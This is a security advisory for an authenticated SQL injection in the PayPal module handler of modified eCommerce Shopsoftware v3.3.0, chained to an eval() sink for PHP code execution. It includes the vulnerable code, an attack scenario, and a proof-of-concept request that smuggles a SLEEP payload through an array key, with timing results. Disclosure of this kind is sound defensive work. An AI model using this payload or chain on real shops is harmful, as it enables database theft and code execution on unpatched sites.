# Security Advisory — SQLi in modified eCommerce Shopsoftware

- **ID:** CVE-2026-NNNNN (pending)
- **Published:** 12/11/2026
- **Updated:** 12/11/2026
- **Severity:** High
- **CVSS:** 8.4 — `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`
- **Primary CWE:** CWE-89 (SQL Injection), CWE-95 (Eval Injection)
- **Additional CWE:** CWE-20
- **Status:** No official fix available

## 1. Summary

A **SQL Injection** vulnerability was identified in the administrative panel of **modified eCommerce Shopsoftware v3.3.0**, in the PayPal payment module configuration handler (`paypal_module.php`), allowing arbitrary SQL expressions to be injected into the `WHERE` predicate of an `UPDATE` statement through the **array key** of the `configuration[]` parameter, which unlike its value is concatenated into the query without escaping, validation or allowlisting.

Because the module configuration table also feeds an `eval()` call used to render the module edit screen, the chained exploitation of the two flaws allows an attacker holding a low-privileged administrative session to escalate from arbitrary database writes to **arbitrary PHP code execution** in the application context.

---

## 2. Affected Products

>| Product / Component | Affected Version | Fixed Version | Status |
>| --- | --- | --- | --- |
>| modified eCommerce Shopsoftware | v3.3.0 rev 16825 (29/01/2026) | N/A | Affected |
>| CWE | 89, 95, 20 | | |

---

## 3. Vulnerability Details

>| Field | Value |
>| --- | --- |
>| Affected file | `admin/paypal_module.php`, lines 158–161 |
>| Endpoint | `POST /admin/paypal_module.php?module=<m>&action=update` |
>| Vulnerable parameter | array key of `configuration[...]` (not its value) |
>| Class | Blind time-based SQL Injection, authenticated |
>| Prerequisite | valid administrative session with access to the payment modules screen |

### 3.1 Vulnerable code

```php
if (isset($_POST['configuration']) && count($_POST['configuration']) > 0) {
  foreach ($_POST['configuration'] as $key => $value) {
    xtc_db_query("UPDATE " . TABLE_CONFIGURATION . " SET configuration_value='" . xtc_db_input($value) . "', last_modified = NOW() WHERE configuration_key='" . $key . "'");
  }
}
```
### 3.2 Secondary sink — eval over persisted data

Line 290 of the same file evaluates a value read from the `configuration`
table as PHP code when rendering the module edit screen:

```php
eval('echo ' . $value['set_function'] . var_export((string)$value['value'], true) . ', ' . var_export($key, true) . ');');
```

The `set_function` column is read in lines 26–41. The `configuration` table
is precisely the target of the SQL injection described above.

---

## 4. Impact
Exploitation allows:

- Execution of arbitrary SQL expressions in the context of the shop's database account, which holds write access to every table by application design
- Blind extraction of customer, order, address and payment integration credential data
- Modification or deletion of arbitrary records, including configuration values that govern checkout behaviour
- Tampering with payment module settings, altering checkout behaviour without any audit trail
- Denial of service through deliberately expensive queries
- Dissolution of internal privilege separation: an operator granted permission only to edit a payment module obtains unrestricted database access
- Compromise of the integrity of administrative data

---

## 5. Classification

### CVSS

- **Score:** 8.4
- **Severity:** High
- **Vector:** `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

*Individual scores of the chain components:*

>- **Authenticated SQL Injection** (`configuration[]` array key): **7.2** (High) — `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H`
>- **Eval over persisted data** (`paypal_module.php` line 290, `set_function` column): not independently reachable — amplifies any write to the `configuration` table into code execution
>- **Full chain to PHP code execution** (SQL write → module edit screen render → `eval()`): **8.4** (High) — `AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H`

### CWE

- **CWE-89** — Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- **CWE-95** — Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)
- **CWE-20** — Improper Input Validation

### CAPEC

- **CAPEC-7** — Blind SQL Injection
- **CAPEC-66** — SQL Injection
- **CAPEC-242** — Code Injection


---

## 6. Exploitation Scenario

1. Attacker holds (or obtains) an administrative session with permission to edit payment modules the lowest privilege that reaches the vulnerable screen
2. Attacker opens the PayPal module edit screen at `/admin/paypal_module.php?action=edit&module=paypal` to enumerate the legitimate configuration keys rendered in the form
3. Attacker submits a POST to `action=update` in which the **array key** of `configuration[]` carries an SQL expression appended to a legitimate key name
4. The handler iterates the submitted array and concatenates the key directly into the `WHERE` predicate of the `UPDATE`, applying `xtc_db_input()` only to the value
5. The database parses and evaluates the injected expression; the handler then redirects unconditionally, returning HTTP 200 regardless of outcome
6. Attacker infers results from response timing (`SLEEP()`) or from the resulting state of the target row, extracting or modifying data outside the scope of the payment module
7. By writing into the `set_function` column of the `configuration` table, the attacker causes arbitrary PHP to be evaluated the next time the module edit screen is rendered

*Variant contingent on CSRF:* should the `action=update` handler prove to lack anti-CSRF token validation, steps 1 and 3 collapse into a single crafted request delivered to an authenticated administrator via phishing, removing the requirement for the attacker to hold a session of their own.

---
## 7. Technical Evidence

### Affected Component

```
Endpoint: /admin/paypal_module.php
Parâmetros: configuration[<key>] (POST) — the array KEY, not its value
            action=update, module=<payment_module> (GET)
Método: POST

Vulnerable sink: admin/paypal_module.php, lines 158-161
Secondary sink: admin/paypal_module.php, line 290 (eval over set_function)
```

**Root cause of SQL Injection:** the array key of `$_POST['configuration']` is concatenated into the `WHERE configuration_key='...'` predicate with no escaping, format validation or allowlisting, while the corresponding value is passed through `xtc_db_input()`. The legitimate key set is already available server-side through `$module->keys()`, used to build the very form being submitted, but is never consulted on write.

**Root cause of code execution:** the `set_function` column of the `configuration` table is interpolated into an `eval()` call when rendering the module edit screen, with no restriction to a fixed set of permitted render functions.

**Why the payload survives:** PHP's parameter-name mangling applies only to the identifier preceding the first bracket. The content between brackets is preserved byte for byte, including single quotes, spaces and equals signs. The global `InputFilter` does not neutralise it either `process()` preserves keys containing no HTML tags, and `safeSQL()` processes only first-level string values without walking nested array keys.

---

## 8. Dependencies

Pre-provisioned laboratory environment, accessible via the local network:

```
Target: http://192.168.22.132:8080/admin/paypal_module.php
Software: modified eCommerce Shopsoftware v3.3.0 rev 16825 (29/01/2026)
Database: MariaDB (version to be recorded via SELECT VERSION())
```
- Browser or HTTP client authenticated as administrator in the panel (`/admin/`)
- PayPal payment module installed and visible on the modules screen
- HTTP client capable of transmitting a URL-encoded array key; the PoC runs entirely in the browser via `fetch()`
- Time-based inference requires a database build in which `SLEEP()` is available and evaluated within the `WHERE` predicate

## 9. Proof of Concept

### 9.1 Preconditions

1. Instance of modified eCommerce Shopsoftware v3.3.0 rev 16825 in an authorised environment.
2. Valid administrative session with permission to access payment modules.
3. PayPal module installed and visible on the modules screen.

### 9.2 Request

```http
POST /admin/paypal_module.php?module=paypal&action=update HTTP/1.1
Host: <target>
Content-Type: application/x-www-form-urlencoded
Cookie: MODsid=<administrative-session>

configuration%5BMODULE_PAYMENT_PAYPAL_STATUS%27+AND+SLEEP%283%29+AND+%271%27%3D%271%5D=True
```

### 9.3 Resulting query

```sql
UPDATE configuration
   SET configuration_value = 'True', last_modified = NOW()
 WHERE configuration_key = 'MODULE_PAYMENT_PAYPAL_STATUS'
   AND SLEEP(3)
   AND '1' = '1';
```

In MariaDB, `SLEEP()` returns `0` on completion, so the predicate resolves to false and no row is modified. The sole indicator of the finding is the controlled delay of approximately three seconds.

### 9.4 Observed results

>| Request | Status | Time | Delta |
>| --- | --- | --- | --- |
>| Control — `SLEEP(0)` | 200 | 59 ms | — |
>| PoC — `SLEEP(3)` | 200 | 3,050 ms | 2,991 ms |

Both requests are identical in method, endpoint, session cookie, body structure and payload syntax. The only difference is the numeric argument of `SLEEP()`. This isolates network latency, PHP parsing cost and query cost as explanations, leaving SQL evaluation of the injected expression as the only plausible one. An escaped literal would produce a string comparison with no match and return immediately.

**The delta is approximately three seconds, not a multiple of it.** In MariaDB, `SLEEP()` inside a `WHERE` clause is evaluated once per examined row. Since `configuration_key` carries a unique index, the optimiser resolves the equality through the index and evaluates `SLEEP()` only once. A three-second delta rather than three seconds multiplied by the hundreds of rows in the `configuration` table confirms that the expression entered the parsed predicate and that the execution plan behaved as expected.

**The 200 response does not weaken the finding.** The `action=update` handler terminates in an unconditional `xtc_redirect()` on line 163, regardless of query outcome. The observed status is that of the redirect destination, not of the write.

---

## 10. Credits

***RedScan Research Team***

***Lead Researcher:*** 
>***Carlos Tuma***
>|[Linkedin](https://www.linkedin.com/in/carlos-tuma/)|
>| --- |
>[Github](https://github.com/carlosalbertotuma)|


### Contributors:

>***Smith Braz***
>|[Linkedin](https://www.linkedin.com/in/smith-braz/)|
>| --- |
>[Github](https://github.com/smithbraz)

>***Jaconias***
>|[Linkedin](https://www.linkedin.com/in/jaconias-rocha-x64/)|
>| --- |
>[Github](https://github.com/JaconiasDev)

---
***Author: Edson Luiz da Silva Junior***